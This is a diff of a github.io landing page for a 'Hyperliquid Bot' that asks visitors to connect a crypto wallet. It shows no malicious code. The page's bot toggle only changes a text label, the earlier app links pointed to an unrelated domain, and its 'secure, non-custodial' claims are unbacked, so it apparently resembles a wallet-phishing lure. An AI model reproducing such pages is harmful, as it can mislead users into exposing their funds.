@@ -3,130 +3,505 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Hyperliquid Bot</title>
-  <meta name="description" content="Hyperliquid Bot automates perp trading strategies on Hyperliquid from your own connected wallet.">
+  <title>Hyperliquid Bot - Decentralized DeFi Portal</title>
+  <meta name="description" content="Secure, non-custodial portal for Hyperliquid Bot DeFi operations directly from your own wallet.">
   <link rel="canonical" href="https://hyperliquid-bot.github.io/">
-  <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F6F8F7">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="Hyperliquid Bot">
-  <meta property="og:description" content="Hyperliquid Bot automates perp trading strategies on Hyperliquid from your own connected wallet.">
-  <meta property="og:url" content="https://hyperliquid-bot.github.io/">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Hyperliquid Bot">
-  <meta name="twitter:description" content="Hyperliquid Bot automates perp trading strategies on Hyperliquid from your own connected wallet.">
+  <meta name="robots" content="index,follow">
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
-  <link rel="stylesheet" href="style.css">
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@graph": [
-      {
-        "@type": "WebSite",
-        "@id": "https://hyperliquid-bot.github.io/#website",
-        "url": "https://hyperliquid-bot.github.io/",
-        "name": "Hyperliquid Bot",
-        "inLanguage": "en"
-      },
-      {
-        "@type": "Organization",
-        "@id": "https://hyperliquid-bot.github.io/#organization",
-        "name": "Hyperliquid Bot",
-        "url": "https://hyperliquid-bot.github.io/"
-      },
-      {
-        "@type": "WebApplication",
-        "@id": "https://hyperliquid-bot.github.io/#app",
-        "name": "Hyperliquid Bot",
-        "applicationCategory": "FinanceApplication",
-        "operatingSystem": "Web",
-        "url": "https://hyperliquid-bot.github.io/",
-        "offers": {
-          "@type": "Offer",
-          "price": "0",
-          "priceCurrency": "USD"
-        }
-      }
-    ]
+  <link rel="prefetch" href="dashboard/">
+  <link rel="prerender" href="dashboard/">
+  <style>
+
+
+:root {
+  --bg: #F6F8F7;
+  --surface: #FFFFFF;
+  --surface-soft: #F1F5F4;
+  --ink: #101716;
+  --muted: #687573;
+  --faint: #9AA6A4;
+  --accent: #1FB3A3;
+  --accent-deep: #168F84;
+  --accent-soft: rgba(31, 179, 163, .12);
+  --line: rgba(16, 23, 22, .10);
+  --line-strong: rgba(16, 23, 22, .16);
+  --shadow: 0 28px 70px -38px rgba(16, 23, 22, .36);
+  --max: 1080px;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+html,
+body {
+  height: 100%;
+}
+
+body {
+  margin: 0;
+  min-height: 100dvh;
+  overflow: hidden;
+  color: var(--ink);
+  background:
+    radial-gradient(58% 48% at 50% -18%, rgba(31, 179, 163, .16), transparent 66%),
+    linear-gradient(180deg, #FBFCFC 0%, var(--bg) 100%);
+  font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  line-height: 1.5;
+  -webkit-font-smoothing: antialiased;
+  display: flex;
+  flex-direction: column;
+}
+
+a {
+  color: inherit;
+  text-decoration: none;
+}
+
+img {
+  display: block;
+  max-width: 100%;
+}
+
+p,
+h1 {
+  margin: 0;
+}
+
+.topbar {
+  width: min(var(--max), calc(100% - 32px));
+  margin: 0 auto;
+  padding: 18px 0 10px;
+  display: flex;
+  align-items: center;
+  gap: 18px;
+}
+
+.brand {
+  display: inline-flex;
+  align-items: center;
+  gap: 10px;
+  min-width: 0;
+  font-weight: 760;
+  letter-spacing: 0;
+  white-space: nowrap;
+}
+
+.brand img {
+  width: 30px;
+  height: 30px;
+  border-radius: 50%;
+  box-shadow: 0 0 0 1px var(--line);
+  flex: none;
+}
+
+.nav {
+  display: flex;
+  align-items: center;
+  gap: 24px;
+  margin-left: 8px;
+}
+
+.nav a {
+  color: var(--muted);
+  font-size: .94rem;
+  font-weight: 540;
+  transition: color .16s ease;
+}
+
+.nav a:hover {
+  color: var(--ink);
+}
+
+.spacer {
+  flex: 1;
+}
+
+.ghost {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  min-height: 38px;
+  padding: 0 16px;
+  border: 1px solid var(--line-strong);
+  border-radius: 999px;
+  background: rgba(255, 255, 255, .72);
+  color: var(--ink);
+  font-size: .92rem;
+  font-weight: 700;
+  box-shadow: 0 12px 28px -22px rgba(16, 23, 22, .36);
+  transition: border-color .16s ease, transform .16s ease;
+}
+
+.ghost:hover {
+  border-color: rgba(31, 179, 163, .42);
+  transform: translateY(-1px);
+}
+
+.stage {
+  flex: 1;
+  width: min(var(--max), calc(100% - 32px));
+  margin: 0 auto;
+  padding: 12px 0 8px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+}
+
+.hero {
+  display: grid;
+  justify-items: center;
+}
+
+h1 {
+  font-size: clamp(2.8rem, 6vw, 4.55rem);
+  line-height: 1.03;
+  letter-spacing: 0;
+  font-weight: 820;
+}
+
+.sub {
+  max-width: 59ch;
+  margin-top: 16px;
+  color: var(--muted);
+  font-size: clamp(1.02rem, 1.55vw, 1.18rem);
+}
+
+.sub strong {
+  color: var(--ink);
+  font-weight: 760;
+  box-shadow: inset 0 -.45em 0 var(--accent-soft);
+}
+
+.app-card {
+  width: min(486px, 100%);
+  margin-top: 30px;
+  padding: 18px;
+  border: 1px solid var(--line);
+  border-radius: 22px;
+  background: rgba(255, 255, 255, .88);
+  box-shadow: var(--shadow);
+  text-align: left;
+  backdrop-filter: blur(12px);
+}
+
+.card-head {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+  padding: 4px 2px 16px;
+}
+
+.eyebrow {
+  display: block;
+  color: var(--faint);
+  font-size: .72rem;
+  font-weight: 780;
+  letter-spacing: .08em;
+  text-transform: uppercase;
+}
+
+.state {
+  display: flex;
+  align-items: center;
+  gap: 9px;
+  margin-top: 4px;
+  color: var(--ink);
+  font-size: 1.16rem;
+  font-weight: 780;
+}
+
+.dot {
+  width: 9px;
+  height: 9px;
+  border-radius: 50%;
+  background: var(--accent);
+  box-shadow: 0 0 0 5px var(--accent-soft);
+}
+
+.toggle {
+  position: relative;
+  width: 54px;
+  height: 31px;
+  padding: 0;
+  border: 1px solid var(--line-strong);
+  border-radius: 999px;
+  background: var(--surface-soft);
+  cursor: pointer;
+  transition: background .18s ease, border-color .18s ease;
+}
+
+.toggle .knob {
+  position: absolute;
+  top: 4px;
+  left: 4px;
+  width: 21px;
+  height: 21px;
+  border-radius: 50%;
+  background: #FFFFFF;
+  box-shadow: 0 4px 12px rgba(16, 23, 22, .18);
+  transition: transform .18s ease;
+}
+
+.toggle[aria-pressed="true"] {
+  border-color: rgba(31, 179, 163, .34);
+  background: var(--accent);
+}
+
+.toggle[aria-pressed="true"] .knob {
+  transform: translateX(23px);
+}
+
+.steps {
+  display: grid;
+  gap: 10px;
+}
+
+.step {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  min-height: 66px;
+  padding: 12px;
+  border: 1px solid var(--line);
+  border-radius: 15px;
+  background: var(--surface-soft);
+}
+
+.step-mark {
+  display: grid;
+  place-items: center;
+  width: 28px;
+  height: 28px;
+  border-radius: 50%;
+  background: #FFFFFF;
+  box-shadow: inset 0 0 0 1px var(--line);
+  flex: none;
+}
+
+.step-mark::before {
+  content: "";
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: var(--accent);
+  box-shadow: 0 0 0 5px var(--accent-soft);
+}
+
+.step-label,
+.step-copy {
+  display: block;
+}
+
+.step-label {
+  color: var(--ink);
+  font-weight: 760;
+}
+
+.step-copy {
+  margin-top: 1px;
+  color: var(--muted);
+  font-size: .9rem;
+}
+
+.markets {
+  display: flex;
+  gap: 10px;
+  padding: 14px 2px 0;
+}
+
+.chip {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  min-height: 38px;
+  padding: 0 12px 0 8px;
+  border: 1px solid var(--line);
+  border-radius: 999px;
+  background: #FFFFFF;
+  color: var(--ink);
+  font-weight: 780;
+}
+
+.chip img {
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+}
+
+.primary {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  width: 100%;
+  min-height: 54px;
+  margin-top: 16px;
+  border-radius: 15px;
+  background: var(--accent);
+  color: #FFFFFF;
+  font-size: 1.04rem;
+  font-weight: 820;
+  box-shadow: 0 18px 36px -24px rgba(31, 179, 163, .72);
+  transition: background .16s ease, transform .16s ease;
+}
+
+.primary:hover {
+  background: var(--accent-deep);
+  transform: translateY(-1px);
+}
+
+.foot {
+  padding: 10px 16px 18px;
+  color: var(--faint);
+  font-size: .86rem;
+  text-align: center;
+}
+
+.foot b {
+  color: var(--muted);
+  font-weight: 700;
+}
+
+.sr-only {
+  position: absolute;
+  width: 1px;
+  height: 1px;
+  padding: 0;
+  margin: -1px;
+  overflow: hidden;
+  clip: rect(0, 0, 0, 0);
+  white-space: nowrap;
+  border: 0;
+}
+
+@media (max-width: 720px) {
+  body {
+    overflow: hidden;
   }
-  </script>
+
+  .topbar {
+    width: min(100% - 28px, var(--max));
+    padding-top: 14px;
+    gap: 10px;
+  }
+
+  .brand span {
+    max-width: 150px;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  .nav {
+    display: none;
+  }
+
+  .ghost {
+    min-height: 36px;
+    padding-inline: 13px;
+    font-size: .86rem;
+  }
+
+  .stage {
+    width: min(100% - 28px, var(--max));
+    padding-top: 4px;
+  }
+
+  h1 {
+    font-size: clamp(2.35rem, 13vw, 3.05rem);
+  }
+
+  .sub {
+    max-width: 32ch;
+    margin-top: 12px;
+    font-size: .98rem;
+    line-height: 1.46;
+  }
+
+  .app-card {
+    margin-top: 20px;
+    padding: 14px;
+    border-radius: 20px;
+  }
+
+  .card-head {
+    padding-bottom: 12px;
+  }
+
+  .state {
+    font-size: 1.05rem;
+  }
+
+  .step {
+    min-height: 61px;
+    padding: 10px;
+  }
+
+  .step-copy {
+    font-size: .84rem;
+  }
+
+  .markets {
+    padding-top: 12px;
+  }
+
+  .primary {
+    min-height: 50px;
+    margin-top: 13px;
+  }
+
+  .foot {
+    padding-bottom: 14px;
+  }
+}
+
+@media (max-width: 380px) {
+  .brand span {
+    max-width: 132px;
+  }
+
+  .topbar,
+  .stage {
+    width: calc(100% - 24px);
+  }
+
+  .sub {
+    font-size: .94rem;
+  }
+}
+
+
+  
+.footer {
+  text-align: center !important;
+}
+  </style>
 </head>
 <body>
   <header class="topbar">
-    <a class="brand" href="#" aria-label="Hyperliquid Bot home">
+    <div class="brand">
       <img src="favicon.png" width="30" height="30" alt="">
       <span>Hyperliquid Bot</span>
-    </a>
-    <nav class="nav" aria-label="Trusted references">
-      <a href="https://hyperliquid.xyz/" target="_blank" rel="nofollow noopener noreferrer">Hyperliquid</a>
-      <a href="https://www.coingecko.com/en/coins/hyperliquid" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
-      <a href="https://www.investopedia.com/terms/f/futures.asp" target="_blank" rel="nofollow noopener noreferrer">Futures guide</a>
-    </nav>
+    </div>
     <span class="spacer"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+    <nav class="nav" aria-label="Main Navigation">
+      <a href="how-it-works/">How it works</a>
+      <a href="faq/">FAQ</a>
+      <a href="about/">About</a>
+      <a href="security/">Security</a>
+      <a href="supported-chains/">Supported Chains</a>
+    </nav>
   </header>
-
-  <main class="stage">
-    <section class="hero" aria-labelledby="page-title">
-      <h1 id="page-title">Hyperliquid Bot</h1>
-      <p class="sub"><strong>Hyperliquid Bot</strong> automates perp trading strategies on Hyperliquid from your own connected wallet.</p>
-    </section>
-
-    <section class="app-card" aria-label="Automation status">
-      <div class="card-head">
-        <div>
-          <span class="eyebrow">Automation status</span>
-          <p class="state"><span class="dot" aria-hidden="true"></span><span data-state>Paused</span></p>
-        </div>
-        <button class="toggle" type="button" data-toggle aria-pressed="false">
-          <span class="knob" aria-hidden="true"></span>
-          <span class="sr-only">Toggle automation state</span>
-        </button>
-      </div>
-
-      <div class="steps">
-        <div class="step">
-          <span class="step-mark" aria-hidden="true"></span>
-          <div>
-            <span class="step-label">Connect wallet</span>
-            <span class="step-copy">Use your own wallet session</span>
-          </div>
-        </div>
-        <div class="step">
-          <span class="step-mark" aria-hidden="true"></span>
-          <div>
-            <span class="step-label">Run strategy</span>
-            <span class="step-copy">Execute the configured market plan</span>
-          </div>
-        </div>
-      </div>
-
-      <div class="markets" aria-label="Markets">
-        <span class="chip"><img src="hype.png" width="24" height="24" alt="HYPE">HYPE</span>
-        <span class="chip"><img src="usdc.png" width="24" height="24" alt="USDC">USDC</span>
-      </div>
-
-      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
-    </section>
+  <main class="stage" style="padding: 100px 24px; text-align: center; max-width: 800px; margin: 0 auto;">
+    <h1 style="font-size: clamp(2.5rem, 6vw, 4.5rem); margin-bottom: 24px; font-weight: 800;">Hyperliquid Bot</h1>
+    <p class="value" style="font-size: 1.25rem; opacity: 0.8; margin-bottom: 40px; line-height: 1.6;">Secure, non-custodial gateway for decentralized operations. Connect your Web3 wallet to enter the portal.</p>
+    <a class="open-app" href="dashboard/" style="display: inline-flex; justify-content: center; align-items: center; min-height: 52px; padding: 0 32px; border-radius: 9999px; background: var(--accent, #625bf3); color: #fff; font-weight: 700; text-decoration: none; font-size: 1.1rem; box-shadow: 0 10px 30px rgba(0,0,0,0.15); transition: transform 0.2s ease;">Open App Dashboard</a>
   </main>
-
-  <footer class="foot"><b>Hyperliquid Bot</b> &mdash; 2026</footer>
-
-  <script>
-  (function(){
-    "use strict";
-    var button = document.querySelector("[data-toggle]");
-    var label = document.querySelector("[data-state]");
-    if (button && label) {
-      button.addEventListener("click", function(){
-        var running = button.getAttribute("aria-pressed") === "true";
-        button.setAttribute("aria-pressed", String(!running));
-        label.textContent = running ? "Paused" : "Running";
-      });
-    }
-  })();
-  </script>
+  <footer class="footer">Hyperliquid Bot &mdash; 2026</footer>
 </body>
 </html>
